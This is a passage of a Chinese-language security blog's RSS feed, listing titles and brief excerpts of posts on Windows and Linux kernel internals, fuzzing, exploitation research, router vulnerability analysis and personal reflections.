<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Ghostasky&#39;s Blog</title>
    <link>http://ghostasky.github.io/</link>
    <description>Recent content on Ghostasky&#39;s Blog</description>
    <generator>Hugo</generator>
    <language>zh-CN</language>
    <managingEditor>wt20wl@gmail.com (Ghostasky)</managingEditor>
    <webMaster>wt20wl@gmail.com (Ghostasky)</webMaster>
    <lastBuildDate>Wed, 29 May 2024 00:00:00 +0000</lastBuildDate>
    <atom:link href="http://ghostasky.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>涛 の 胡言乱语 &amp; 自言自语</title>
      <link>http://ghostasky.github.io/posts/top/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/top/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>碎碎存</title>
      <link>http://ghostasky.github.io/posts/top%E8%AE%B0%E5%BD%95/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/top%E8%AE%B0%E5%BD%95/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>Deep Learning</title>
      <link>http://ghostasky.github.io/posts/2024-dl/</link>
      <pubDate>Wed, 29 May 2024 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2024-dl/</guid>
      <description>&lt;p&gt;[toc]&lt;/p&gt;&#xA;&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>2023年终总结</title>
      <link>http://ghostasky.github.io/posts/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
      <pubDate>Tue, 02 Jan 2024 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>AFL调试与记录</title>
      <link>http://ghostasky.github.io/posts/2023-12-afldebug/</link>
      <pubDate>Fri, 15 Dec 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-12-afldebug/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>论文阅读：Fuzzing：a survey</title>
      <link>http://ghostasky.github.io/posts/2023-12-fuzzing-a-survey/</link>
      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-12-fuzzing-a-survey/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>论文阅读：A systematic review of fuzzing techniques</title>
      <link>http://ghostasky.github.io/posts/2023-12-a-systematic-review-of-fuzzing-techniques/</link>
      <pubDate>Wed, 13 Dec 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-12-a-systematic-review-of-fuzzing-techniques/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>秋招 | 终</title>
      <link>http://ghostasky.github.io/posts/2023-11-%E7%A7%8B%E6%8B%9B/</link>
      <pubDate>Wed, 15 Nov 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-11-%E7%A7%8B%E6%8B%9B/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>AFL源码阅读</title>
      <link>http://ghostasky.github.io/posts/2023-9-aflsourceread/</link>
      <pubDate>Sat, 16 Sep 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-9-aflsourceread/</guid>
      <description>阅读源码的主要目标应该是： 理清静态插桩过程（gcc、clang、llvm mode） 理清 fuzz 过程：如何变异、如何将 input 传递给程序、如何收集覆盖度信息 理清 qemu mode 的插桩和执行过程 因此，我们决定阅读顺序： 阅读 afl-gcc.c 和 afl-as.c，即静态插桩相关代码 阅读 afl-tmin.c</description>
    </item>
    <item>
      <title>浅析WRK进程与线程</title>
      <link>http://ghostasky.github.io/posts/2023-9-wrkprocessthread/</link>
      <pubDate>Tue, 12 Sep 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-9-wrkprocessthread/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>浅析WRK内存管理</title>
      <link>http://ghostasky.github.io/posts/2023-9-wrkmem/</link>
      <pubDate>Tue, 12 Sep 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-9-wrkmem/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>浅析WRK引导过程</title>
      <link>http://ghostasky.github.io/posts/2023-9-wrkload/</link>
      <pubDate>Tue, 12 Sep 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-9-wrkload/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>Angr学习</title>
      <link>http://ghostasky.github.io/posts/2023-9-angr/</link>
      <pubDate>Mon, 04 Sep 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-9-angr/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>【译】Scoop The Windows 10 Pool</title>
      <link>http://ghostasky.github.io/posts/2023-8-scoopthewindows10pool/</link>
      <pubDate>Thu, 24 Aug 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-8-scoopthewindows10pool/</guid>
      <description>SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf https://github.com/synacktiv/Windows-kernel-SegmentHeap-Aligned-Chunk-Confusion https://paper.seebug.org/1743/ https://github.com/cbayet/Exploit-CVE-2017-6008/blob/master/Windows10PoolParty.pdf 摘要：堆溢出是应用程序中相当常见的漏洞。利用这类漏洞通常依赖于对用于管理堆的基础机制的深入理解。Windows 10 最近改变了其在内核空间中管理堆的方式。本文旨在介绍Windows NT内核中堆机制的最新演变，并介绍针对内核池的新的利用技</description>
    </item>
    <item>
      <title>【译】Kernel Pool Exploitation on Windows 7</title>
      <link>http://ghostasky.github.io/posts/2023-8-kernelpoolexploitationonwin7/</link>
      <pubDate>Wed, 16 Aug 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-8-kernelpoolexploitationonwin7/</guid>
      <description>https://dl.packetstormsecurity.net/papers/general/kernelpool-exploitation.pdf https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf?source=post_page https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf 摘要：在Windows 7中，微软引入了safe unlinking技术来解决影响Windows内核的安全公告日益增多的问题。在从双向链表中删除条目之前，safe unlinking旨在通过验证相邻列表条目的指针来检测内存损坏。因此，攻击者</description>
    </item>
    <item>
      <title>HEVD-Windows7x86 SP1 记录</title>
      <link>http://ghostasky.github.io/posts/2023-8-hevd/</link>
      <pubDate>Sat, 12 Aug 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-8-hevd/</guid>
      <description>本文记录自己学习HEVD的全过程。 差不多全部完成了，还有一些小的问题需要完善，然后还有几篇文没有好好看，挑个时间好好看下 就这样吧，待完善的东西以后再说 [toc] 1.环境搭建 虚拟机： 文件名 cn_windows_7_professional_with_sp1_vl_build_x86_dvd_u_677939.iso SHA1 27AE9FBAF9EE076F50F153353E42A3BE74A61FAB 文件大小 2.33GB 发布时间 2011-05-12 ed2k://|file|cn_windows_7_professional_with_sp1_vl_build_x86_dvd_u_677939.iso|2502909952|935E5B4B754527BE3C238FA6ABDD9B86|/ 这个装vmtools有点费劲，用了</description>
    </item>
    <item>
      <title>Linux Kernel Pwn</title>
      <link>http://ghostasky.github.io/posts/2023-7-linuxkernelpwn/</link>
      <pubDate>Sun, 16 Jul 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-7-linuxkernelpwn/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linux0.11 源码阅读</title>
      <link>http://ghostasky.github.io/posts/2023-7-linuxsourceread/</link>
      <pubDate>Mon, 10 Jul 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-7-linuxsourceread/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>Stable Diffusion QR Code</title>
      <link>http://ghostasky.github.io/posts/2023-7-sdqrcode/</link>
      <pubDate>Sun, 09 Jul 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-7-sdqrcode/</guid>
      <description>起源 上个月就有看到用AI生成可扫描的二维码的文章（AI 生成可扫码图像 — 新 ControlNet 模型展示），但是没有说具体的制作细节，当时还在reddit上搜了半天，但是制作出来的效果都差强人意。 昨天看到宝玉转发了一个用 Stable Diffusion 制作可扫描二维码的推特，里面有详细的制</description>
    </item>
    <item>
      <title>Syscall Journey</title>
      <link>http://ghostasky.github.io/posts/2023-7-win-syscalljourney/</link>
      <pubDate>Mon, 03 Jul 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-7-win-syscalljourney/</guid>
      <description>本文记录一下syscall的“旅程”。 这里使用的是win10x64 22H2 19045.3086 与其他进程、内存、驱动器或文件系统交互时，使用 Kernel32.dll 中的函数 与 Windows GUI 交互，使用的是 user32.dll 和 gdi32.dll 中的函数 并非所有 Kernel32 、 user32 和 gdi32 函数都以直接系统调用结束 Nt* 、 Zw* 、 NtUser* 和 NtGdi* 函数的“真正”代码在内核</description>
    </item>
    <item>
      <title>【译】AFL白皮书</title>
      <link>http://ghostasky.github.io/posts/2023-5aflwritepaper/</link>
      <pubDate>Tue, 16 May 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-5aflwritepaper/</guid>
      <description>[toc] AFL 翻译 afl-fuzz 技术 白皮书 本文档快速概述了American Fuzzy Lop的核心内容。 请参阅README获取一般指导手册；有关AFL背后动机和设计目标的讨论，请参阅historical_notes.txt。 historical_notes: 这篇文档主要谈论了AFL（American Fuzzy L</description>
    </item>
    <item>
      <title>反检测(更新中...)</title>
      <link>http://ghostasky.github.io/posts/2023-5antidebug/</link>
      <pubDate>Thu, 04 May 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-5antidebug/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>近期面试总结&amp;其他</title>
      <link>http://ghostasky.github.io/posts/2023-3%E9%9D%A2%E8%AF%95/</link>
      <pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-3%E9%9D%A2%E8%AF%95/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>Windows内核(十一)——软件调试</title>
      <link>http://ghostasky.github.io/posts/2023-3-winkernel%E8%B0%83%E8%AF%95/</link>
      <pubDate>Sun, 12 Mar 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-3-winkernel%E8%B0%83%E8%AF%95/</guid>
      <description>[toc] 最后一部分了，接下来好好写个调试器，看看win内核的洞去了。 01.调试对象 调试器与被调试程序 示例图如下： 调试器与被调试对象建立联系的方式： CreateProcess（创建进程） DebugActiveProcess（附加进程） 这里主要是附加</description>
    </item>
    <item>
      <title>Windows内核(十)——消息机制</title>
      <link>http://ghostasky.github.io/posts/2023-3-winkernel%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6/</link>
      <pubDate>Tue, 07 Mar 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-3-winkernel%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6/</guid>
      <description>[toc] 1.消息队列 消息队列 本质上是一种数据结构，先进先出。 消息队列在哪 Linux：专用进程 使用专用进程捕获所有消息 判断消息所属进程，进行分发，将消息分配到目标进程的消息队列中 Windows：GUI线程 KTHREAD结构体： kd&amp;gt; dt _KTHREAD ntdll!_KTHREAD ... +0x130 Win32Thread //若当</description>
    </item>
    <item>
      <title>Windows内核(九)——内存管理</title>
      <link>http://ghostasky.github.io/posts/2023-3-winkernel%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</link>
      <pubDate>Sun, 05 Mar 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-3-winkernel%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</guid>
      <description>[toc] 01.线性地址的管理 每个进程都有自己的用户空间需要管理，当我们使用VirtualAlloc等函数申请一块固定的地址空间时，首先需要确认这块空间是否被占用，如果该空间已被占用则申请失败。 用户空间并非像内核空间一样通过一块链表去管理已占用的线</description>
    </item>
    <item>
      <title>Windows内核(八)——异常</title>
      <link>http://ghostasky.github.io/posts/2023-3-winkernel%E5%BC%82%E5%B8%B8/</link>
      <pubDate>Thu, 02 Mar 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-3-winkernel%E5%BC%82%E5%B8%B8/</guid>
      <description>[toc] 01.CPU异常记录 一个异常产生后，首先是要记录异常信息（异常的类型、异常发生的位置等），然后要寻找异常的处理函数，称为异常的分发,最后找到异常处理函数并调用，称为异常处理。 分类： CPU产生的异常 软件产生的异常 异常处理流程 CPU指令检测到</description>
    </item>
    <item>
      <title>Windows内核(七)——APC机制</title>
      <link>http://ghostasky.github.io/posts/2023-2-winkernelapc/</link>
      <pubDate>Sun, 26 Feb 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-2-winkernelapc/</guid>
      <description>[toc] 01.APC的本质 线程是不能被“杀掉”、“挂起”、“恢复”的，线程在执行的时候自己占据着CPU，别人不能控制它 举个极端的例子：如果不调用API，屏蔽中断，并保证代码不出现异常，线程将永久占用CPU 所以说线程如果想“死”，一定是自己执行代码</description>
    </item>
    <item>
      <title>Windows内核(六)——事件等待</title>
      <link>http://ghostasky.github.io/posts/2023-2-winkernel%E4%BA%8B%E4%BB%B6%E7%AD%89%E5%BE%85/</link>
      <pubDate>Thu, 23 Feb 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-2-winkernel%E4%BA%8B%E4%BB%B6%E7%AD%89%E5%BE%85/</guid>
      <description>[toc] 01.临界区 这个部分在驱动那一部分写了，这里就直接复制粘贴过来了 并发是指多个线程在同时执行： 单核（是分时执行，不是真正的同时） 多核（在某一个时刻，会同时有多个线程再执行） 同步则是保证在并发执行的环境中各个线程可以有序的执行 单行指令的同步 DWORD</description>
    </item>
    <item>
      <title>Windows内核(五)——句柄表</title>
      <link>http://ghostasky.github.io/posts/2023-2-winkernel%E5%8F%A5%E6%9F%84%E8%A1%A8/</link>
      <pubDate>Sun, 19 Feb 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-2-winkernel%E5%8F%A5%E6%9F%84%E8%A1%A8/</guid>
      <description>[toc] 01.句柄表 当一个进程创建或者打开一个内核对象时，将获得一个句柄，通过这个句柄可以访问对应的内核对象 句柄表存储在零环，一个进程使用了几个句柄，在该进程的句柄表中就会存储几个句柄 所有的句柄所对应的内核对象，都包含在**_OBJECT_HEA</description>
    </item>
    <item>
      <title>Windows内核(四)——进程线程</title>
      <link>http://ghostasky.github.io/posts/2023-2-winkernel%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/</link>
      <pubDate>Sat, 18 Feb 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-2-winkernel%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/</guid>
      <description>[toc] 进程&amp;amp;线程 滴水中级上 001.进程结构体 每个windows进程在0环都有一个对应的结构体：EPROCESS ，这个结构体包含了进程所有重要的信息。 EPROCESS kd&amp;gt; dt _EPROCESS ntdll!_EPROCESS +0x000 Pcb : _KPROCESS +0x06c ProcessLock : _EX_PUSH_LOCK +0x070 CreateTime : _LARGE_INTEGER//进程的创建时间 +0x078 ExitTime : _L</description>
    </item>
    <item>
      <title>《大学之路》书摘_吴军</title>
      <link>http://ghostasky.github.io/posts/%E5%A4%A7%E5%AD%A6%E4%B9%8B%E8%B7%AF/</link>
      <pubDate>Wed, 25 Jan 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/%E5%A4%A7%E5%AD%A6%E4%B9%8B%E8%B7%AF/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>《退步集》书摘_陈丹青</title>
      <link>http://ghostasky.github.io/posts/%E9%99%88%E4%B8%B9%E9%9D%92_%E9%80%80%E6%AD%A5%E9%9B%86/</link>
      <pubDate>Tue, 24 Jan 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/%E9%99%88%E4%B8%B9%E9%9D%92_%E9%80%80%E6%AD%A5%E9%9B%86/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>2022年终总结</title>
      <link>http://ghostasky.github.io/posts/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
      <pubDate>Sun, 22 Jan 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>Windows内核(二)——驱动</title>
      <link>http://ghostasky.github.io/posts/2023-1-winkernel%E9%A9%B1%E5%8A%A8/</link>
      <pubDate>Wed, 18 Jan 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-1-winkernel%E9%A9%B1%E5%8A%A8/</guid>
      <description>[toc] 001.驱动开发环境配置 vs2010:https://learn.microsoft.com/zh-cn/visualstudio/releasenotes/vs2010-sp1-vs wdk7600:https://www.microsoft.com/en-us/download/details.aspx?id=11800 添加项目属性表： &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-8&amp;#34;?&amp;gt; &amp;lt;Project ToolsVersion=&amp;#34;4.0&amp;#34; xmlns=&amp;#34;http://schemas.microsoft.com/developer/msbuild/2003&amp;#34;&amp;gt; &amp;lt;ImportGroup Label=&amp;#34;PropertySheets&amp;#34; /&amp;gt; &amp;lt;PropertyGroup Label=&amp;#34;UserMacros&amp;#34; /&amp;gt; &amp;lt;PropertyGroup&amp;gt; &amp;lt;ExecutablePath&amp;gt;D:\WinDDK\7600.16385.1\bin\x86;$(ExecutablePath)&amp;lt;/ExecutablePath&amp;gt; &amp;lt;/PropertyGroup&amp;gt; &amp;lt;PropertyGroup&amp;gt; &amp;lt;IncludePath&amp;gt;D:\WinDDK\7600.16385.1\inc\api;D:\WinDDK\7600.16385.1\inc\ddk;D:\WinDDK\7600.16385.1\inc\crt;$(IncludePath)&amp;lt;/IncludePath&amp;gt; &amp;lt;/PropertyGroup&amp;gt; &amp;lt;PropertyGroup&amp;gt; &amp;lt;LibraryPath&amp;gt;D:\WinDDK\7600.16385.1\lib\wxp\i386;$(LibraryPath)&amp;lt;/LibraryPath&amp;gt; &amp;lt;TargetExt&amp;gt;.sys&amp;lt;/TargetExt&amp;gt; &amp;lt;LinkIncremental&amp;gt;false&amp;lt;/LinkIncremental&amp;gt; &amp;lt;GenerateManifest&amp;gt;false&amp;lt;/GenerateManifest&amp;gt; &amp;lt;/PropertyGroup&amp;gt; &amp;lt;ItemDefinitionGroup&amp;gt; &amp;lt;ClCompile&amp;gt; &amp;lt;PreprocessorDefinitions&amp;gt;_X86_;DBG&amp;lt;/PreprocessorDefinitions&amp;gt; &amp;lt;CallingConvention&amp;gt;StdCall&amp;lt;/CallingConvention&amp;gt; &amp;lt;ExceptionHandling&amp;gt;false&amp;lt;/ExceptionHandling&amp;gt; &amp;lt;BasicRuntimeChecks&amp;gt;Default&amp;lt;/BasicRuntimeChecks&amp;gt; &amp;lt;BufferSecurityCheck&amp;gt;false&amp;lt;/BufferSecurityCheck&amp;gt; &amp;lt;CompileAs&amp;gt;Default&amp;lt;/CompileAs&amp;gt; &amp;lt;DebugInformationFormat&amp;gt;ProgramDatabase&amp;lt;/DebugInformationFormat&amp;gt; &amp;lt;AssemblerOutput&amp;gt;All&amp;lt;/AssemblerOutput&amp;gt; &amp;lt;/ClCompile&amp;gt; &amp;lt;Link&amp;gt; &amp;lt;AdditionalDependencies&amp;gt;ntoskrnl.lib;wdm.lib;wdmsec.lib;wmilib.lib;ndis.lib;Hal.lib;MSVCRT.LIB;LIBCMT.LIB;%(AdditionalDependencies)&amp;lt;/AdditionalDependencies&amp;gt; &amp;lt;/Link&amp;gt; &amp;lt;Link&amp;gt; &amp;lt;IgnoreAllDefaultLibraries&amp;gt;true&amp;lt;/IgnoreAllDefaultLibraries&amp;gt; &amp;lt;EnableUAC&amp;gt;false&amp;lt;/EnableUAC&amp;gt; &amp;lt;SubSystem&amp;gt;Native&amp;lt;/SubSystem&amp;gt; &amp;lt;EntryPointSymbol&amp;gt;DriverEntry&amp;lt;/EntryPointSymbol&amp;gt; &amp;lt;BaseAddress&amp;gt;0x10000&amp;lt;/BaseAddress&amp;gt; &amp;lt;RandomizedBaseAddress&amp;gt; &amp;lt;/RandomizedBaseAddress&amp;gt; &amp;lt;DataExecutionPrevention&amp;gt; &amp;lt;/DataExecutionPrevention&amp;gt; &amp;lt;GenerateDebugInformation&amp;gt;true&amp;lt;/GenerateDebugInformation&amp;gt; &amp;lt;Driver&amp;gt;Driver&amp;lt;/Driver&amp;gt; &amp;lt;/Link&amp;gt; &amp;lt;/ItemDefinitionGroup&amp;gt; &amp;lt;ItemGroup /&amp;gt; &amp;lt;/Project&amp;gt; 002.第一个驱动程序 驱动开发流程： 代码 =&amp;gt; 生成sys文件 =&amp;gt; 部署 =&amp;gt; 启动 =&amp;gt; 停止 =&amp;gt; 卸载 ##include &amp;lt;ntddk.h&amp;gt;</description>
    </item>
    <item>
      <title>Windows内核(三)——系统调用</title>
      <link>http://ghostasky.github.io/posts/2023-1-winkernel%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</link>
      <pubDate>Mon, 16 Jan 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-1-winkernel%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</guid>
      <description>[toc] 本文是windows内核系列的第三部分，本来应该是放到第二部分后面的，但是第二部分会用到这部分的相关内容 ，就先放第三部分了。 001.API函数的调用过程(3环部分) 主要是存放在 C:\WINDOWS\system32 下面所有的dll 几个重要的DLL Kernel32.dll:最</description>
    </item>
    <item>
      <title>DLink 815路由器栈溢出漏洞分析与复现</title>
      <link>http://ghostasky.github.io/posts/dir815/</link>
      <pubDate>Sun, 23 Oct 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/dir815/</guid>
      <description>没玩过IOT，搞个简单的分析下 踩了非常多的坑，光环境就搞了好久，，QAQ MIPS架构特性 叶子函数与非叶子函数 叶子函数：函数内没有调用其他函数，返回地址直接在$ra寄存器中2 非叶子函数：函数内调用其他函数，返回地址$ra首先通过sw放入栈中，</description>
    </item>
    <item>
      <title>Windows Program Learn_0x1</title>
      <link>http://ghostasky.github.io/posts/2022-9-wincode1/</link>
      <pubDate>Mon, 10 Oct 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2022-9-wincode1/</guid>
      <description>[toc] 准备开个系列，就叫“Windows Program Learn”，记录《Windows黑客编程技术详解》书的代码和笔记。 https://github.com/jash-git/Windows-Hack-Programming-backup 基础 最开始是环境的搭建，这里就不搞了，好像也没啥。 单一实例 也就是实现进程互斥。 CreateMutexA HANDLE CreateMutexA( [in, optional] LPSECURITY_ATTRIBUTES lpMutexAttributes, [in] BOOL bInitialOwner, [in, optional] LPCSTR lpName ); 参数： lpMutexAt</description>
    </item>
    <item>
      <title>HTTP Smuggling攻击</title>
      <link>http://ghostasky.github.io/posts/2022-10-http/</link>
      <pubDate>Wed, 05 Oct 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2022-10-http/</guid>
      <description>[toc] TimeLine 2004年，@Amit Klein 提出 HTTP Response Splitting 技术，雏形 2005年，@Watchfire 首次提出 HTTP Request Smuggling 2016 年 Defcon 24 ，@regilero 提出了 [Hiding Wookiees In Http](https://media.defcon.org/DEF CON 24/DEF CON 24 presentations/DEF CON 24 - Regilero-Hiding-Wookiees-In-Http.pdf)，进一步揭示了</description>
    </item>
    <item>
      <title>这两年我学到了什么</title>
      <link>http://ghostasky.github.io/posts/2022-9-%E8%BF%99%E4%B8%A4%E5%B9%B4%E6%88%91%E5%AD%A6%E5%88%B0%E4%BA%86%E4%BB%80%E4%B9%88/</link>
      <pubDate>Wed, 28 Sep 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2022-9-%E8%BF%99%E4%B8%A4%E5%B9%B4%E6%88%91%E5%AD%A6%E5%88%B0%E4%BA%86%E4%BB%80%E4%B9%88/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>Windows内核(一)——保护模式</title>
      <link>http://ghostasky.github.io/posts/2022-9-winkernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Mon, 26 Sep 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2022-9-winkernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/</guid>
      <description>[toc] 001.保护模式 x86CPU三个模式：实模式， 保护模式，虚拟8086模式 市面上能见到的x64对x86向下兼容，是x86的扩展 保护模式特点： 段的机制 页的基址 002.段寄存器结构 学段机制之前先要知道段寄存器结构 mov dword ptr ds:[0x123456],eax 实际上读的地址是：ds.</description>
    </item>
    <item>
      <title>YARA规则</title>
      <link>http://ghostasky.github.io/posts/2022-8-13-yara/</link>
      <pubDate>Sat, 13 Aug 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2022-8-13-yara/</guid>
